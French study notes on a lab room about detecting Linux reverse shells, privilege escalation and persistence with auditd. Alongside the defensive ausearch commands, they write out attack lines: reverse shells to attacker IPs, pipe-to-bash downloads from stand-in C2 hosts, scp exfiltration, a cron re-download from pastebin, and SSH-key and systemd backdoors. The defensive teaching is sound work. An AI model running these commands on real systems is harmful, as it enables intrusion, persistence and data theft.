## Reverse Shells

### Attack Convenience

Les reverse shells compensent les limitations d'un accès initial via exploit/web (pas de Ctrl+C, timeouts, restrictions réseau) : la victime initie une connexion vers l'attaquant.

![[attack_convenience.png]]

| Commande (victime)                                                     | Explication                                                                |
| ---------------------------------------------------------------------- | -------------------------------------------------------------------------- |
| `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1`                            | La victime se connecte à `10.10.10.10:1337` et lance bash pour l'attaquant |
| `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane` | Alternative socat. L'attaquant écoute sur `10.20.20.20:2525`               |
| `python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'`   | Alternative python3. L'attaquant écoute sur `10.30.30.30:80`               |

### Detecting Reverse Shells

Reverse shells = alerte critique SOC (système compromis, attaquant actif). Détectables via `auditd`.

**Remonter l'origine (process tree vers le haut) :**

bash

```bash
ausearch -i -x socat               # Détecter la commande suspecte → récupérer ppid
ausearch -i --pid <ppid>           # Remonter au parent → récupérer son ppid
ausearch -i --pid <ppid_parent>    # Confirmer l'origine (ex: app vulnérable)
```

### Finding Reverse Shell Origin

Exemple réel :

- `socat` (pid 27808) → lancé par `/bin/sh -c ... && socat` (pid 27806) → lancé par `/usr/bin/python3 /opt/trypingme/main.py` (pid 27796) → origine confirmée : app TryPingMe.

### Listing Reverse Shell Activity

**Lister toutes les commandes exécutées depuis le shell (process tree vers le bas) :**

bash

```bash
ausearch -i -x socat                          # Récupérer le pid du reverse shell
ausearch -i --ppid <pid_shell> | grep proctitle  # Lister tous les enfants
```

Exemple de résultat : `id`, `uname -a`, `ls -la .` → activité Discovery post-compromission.

---

## Privilege Escalation

### Privilege Escalation Basics

L'accès initial est souvent un user bas-privilège (ex: `www-data`) limité en actions. L'attaquant doit escalader pour atteindre `root`.

| Discovery (SI)                                                    | Privilege Escalation (ALORS)                                                       |
| ----------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| `uname -a` révèle Ubuntu 16.04 vieux et non patché                | Télécharger et exécuter un exploit : `wget http://bad.thm/pwnkit.sh \| bash`       |
| `find /bin -perm 4000` détecte un binaire `env` avec le flag SUID | Exploiter la vulnérabilité SUID pour obtenir root : `/bin/env /bin/bash -p`        |
| `ls /etc/ssh` expose un fichier `ssh-backup-key` non protégé      | Utiliser la clé pour se connecter en root : `ssh root@127.0.0.1 -i ssh-backup-key` |

### Detecting Privilege Escalation

Détecter l'exploit exact est difficile (des centaines de vecteurs). Approche universelle : détecter les **événements environnants**.

bash

```bash
# Detection 1: A Spike of Discovery Commands
whoami                                           # Returns "www-data" user
id; pwd; ls -la; crontab -l                      # Basic initial Discovery
ps aux | egrep "edr|splunk|elastic"              # Security tools Discovery
uname -r                                         # Returns an old 4.4 kernel

# Detection 2: A Download to Temp Directory
wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c# Pwnkit exploit download
gcc /tmp/pwnkit.c -o /tmp/pwnkit                # Pwnkit exploit compilation
chmod +x /tmp/pwnkit                            # Making exploit executable
/tmp/pwnkit                                     # Trying to use the exploit

# Detection 3: Data Exfiltration With SCP
whoami                                           # Now returns "root" user
tar czf dump.tar.gz /root /etc/                  # Archiving sensitive data
scp dump.tar.gz attacker@c2-server.thm:~         # Exfiltrating the data
```

### Looking for Reverse Shell Activity

bash

```bash
ausearch -i -x pwnkit     # uid=serviceuser → exploit lancé en bas-privilège
ausearch -i --ppid <pid>       # uid=root → shell root spawné par l'exploit
ausearch -i --ppid <pid_root>  # uid=root → attaquant continue en root
```

Indicateur clé : `uid` passe de `serviceuser` à `root` entre le process exploit et son enfant.
Confirmer l'escalade : comparer le champ `uid` **avant** et **après** l'exploit dans auditd.

---

## Startup Persistence

### Persistence in Linux

Les serveurs Linux tournent des années sans reboot. Certains attaquants établissent 1-2 backdoors pour un accès long terme.

### Cron Persistence

Méthode la plus courante. Les cron jobs survivent aux reboots.

**APT29 (GoldMax)** -> exécution du malware au démarrage :

bash

```bash
# Ajouté dans /var/spool/cron/<user>
@reboot nohup /home/<user>/.<hidden-dir>/<malware> > /dev/null 2>&1 &
```

**Rocke (cryptominer)** -> re-téléchargement toutes les 10 minutes (résistance à la suppression) :

bash

```bash
# Ajouté dans /etc/cron.d/root
echo "*/10 * * * root (curl https://pastebin.com/raw/1NtRkBc3) | sh" > /etc/cron.d/root
```

Note the `*/10` part, which means the script will be redownloaded every 10 minutes

### Systemd Persistence

Avec les droits root, un attaquant peut créer un `.service` personnalisé dans `/lib/systemd/system/` ou `/etc/systemd/system/`.

**Sandworm (GOGETTER)** -> service déguisé en service légitime :

ini

```ini
# /lib/systemd/system/cloud-online.service
[Unit]
Description=Initial cloud-online job    # fausse description
[Service]
ExecStart=/usr/bin/cloud-online         # malware GOGETTER
```

### Detecting Persistence

Cron jobs et services systemd sont de simples fichiers texte → monitorables via `auditd`.

|Quoi surveiller|Où|
|---|---|
|Modifications cron|`/etc/crontab`, `/etc/cron.d*`, `/var/spool/cron/*`|
|Modifications systemd|`/lib/systemd/system/*`, `/etc/systemd/system/*`|
|Processus liés|`crontab -e`, `nano /etc/crontab`, `systemctl start\|enable <service>`|

bash

```bash
ausearch -i -f /etc/systemd   # détecter création/modification d'un .service
ausearch -i -x crontab        # détecter exécution de crontab
```

---

## Account Persistence

### Account Persistence

Objectif : maintenir un accès sans malware (ex: revenir un mois plus tard).

### New User Account

Si SSH est exposé, l'attaquant crée un user et l'ajoute au groupe `sudo`.

bash

```bash
# Détection via auth.log
cat /var/log/auth.log | grep -E 'useradd|usermod'

# Puis reconstruire le process tree
ausearch -i --ppid <pid_useradd>
```

Exemple de traces :

```
useradd[27254]: new user: name=support, UID=1001 [...] shell=/bin/bash
usermod[27258]: add 'support' to group 'sudo'
```

### Backdoored SSH Keys

Ajout d'une clé publique malveillante dans `~/.ssh/authorized_keys`. Difficile à détecter car elle se fond parmi les clés légitimes.

bash

```bash
# Ajout du backdoor
echo "AAAAC3Nza...IkiINvQt/R" >> ~/.ssh/authorized_keys
```

Détection : monitorer les modifications de `~/.ssh/authorized_keys` via auditd.

bash

```bash
ausearch -i -f /.ssh/authorized_keys
```

**Attention :** `echo` est un shell builtin → non loggué directement par auditd. La modification apparaît sous le nom `bash` dans les logs, pas `echo`.

### Application Persistence

Un attaquant avec accès admin à une app web (ex: WordPress) peut déposer un web shell (ex: WSO shell) et exécuter des commandes via le navigateur -> sans cron ni SSH.

Ce type de persistance vit dans la couche applicative → **invisible pour auditd et les logs système**.

Si un malware réapparaît sans trace dans les logs système, suspecter une persistence applicative.

![[app_persistence.png]]

---

## Targeted Attacks and Recap

### Targeted Attacks

Contrairement aux attaques automatisées ("Hack and Forget" comme les cryptominers), les attaques ciblées visent des entreprises ou gouvernements spécifiques et utilisent des techniques avancées (Privilege Escalation, Persistence, etc.).

### Linux as Entry Point

Un serveur Linux compromis (firewall, web server, mail server) peut servir de point d'entrée vers un réseau Windows entier -> même si Linux représente 1% de l'infra.

![[linux_as_entry_point.png]]

### Linux in Espionage

Les serveurs Linux sont ciblés par des groupes APT étatiques pour leur accès à des données sensibles. Exemple : **Kimsuky APT** a utilisé la persistence via **systemd service** sur des cibles Linux critiques.

![[linux_in_espionage.png]]

### Linux in Ransomware

Les **hyperviseurs Linux** sont une cible prioritaire : compromettre 3 serveurs physiques peut chiffrer des centaines de VMs Windows hébergées dessus.

![[linux_in_ransomware.png]]

### Threat Detection Recap

Techniques MITRE ATT&CK couvertes dans les rooms Linux Threat Detection :

|Tactique|Techniques vues|
|---|---|
|Initial Access|Exploit web, injection de commande|
|Execution|Reverse shells (bash, socat, python3)|
|Persistence|Cron jobs, systemd services, nouveaux users, SSH backdoor|
|Privilege Escalation|SUID, exploits kernel, clés SSH exposées|
|Discovery|`whoami`, `uname`, `ps`, `find`, `ls`|
|Exfiltration|`tar` + `scp`|

Outil central de détection : **auditd** (`ausearch`) pour reconstruire les process trees et monitorer les fichiers sensibles.

![[linux_threat_detection_recap.png]]

---

## Résumé — Linux Threat Detection 3

### Ce que couvre cette room

Détection des attaques **post-accès initial** sur Linux via `auditd`.

### Reverse Shells

- L'accès initial (exploit, web) est limité → l'attaquant établit un reverse shell pour un vrai terminal
- La victime initie la connexion vers l'attaquant (`nc -lnvp <port>` côté attaquant)
- Détection : `ausearch -i -x <outil>` puis remonter/descendre le process tree avec `--pid` / `--ppid`

### Privilege Escalation

- L'accès initial est souvent bas-privilège → l'attaquant cherche à obtenir `root`
- Vecteurs : kernel exploit, SUID, clés SSH exposées
- Détection indirecte : pic de Discovery + téléchargement dans `/tmp` + changement de `uid` dans les logs auditd

### Startup Persistence

- **Cron** : ajout dans `/etc/cron.d/` ou `/var/spool/cron/` → survit au reboot
- **Systemd** : création d'un `.service` malveillant déguisé en service légitime
- Détection : `ausearch -i -f /etc/systemd` / `ausearch -i -x crontab`

### Account Persistence

- **Nouveau user** : `useradd` + ajout au groupe `sudo` → détectable via `auth.log`
- **SSH backdoor** : ajout d'une clé dans `~/.ssh/authorized_keys` → monitorer le fichier via auditd (`echo` apparaît comme `bash` dans les logs)
- **Web shell** : persistence applicative, invisible pour auditd

### Outil central

bash

```bash
ausearch -i -x <commande>          # détecter un processus suspect
ausearch -i --pid <pid>            # remonter le process tree
ausearch -i --ppid <pid>           # descendre le process tree
ausearch -i -f <fichier>           # détecter modification d'un fichier
```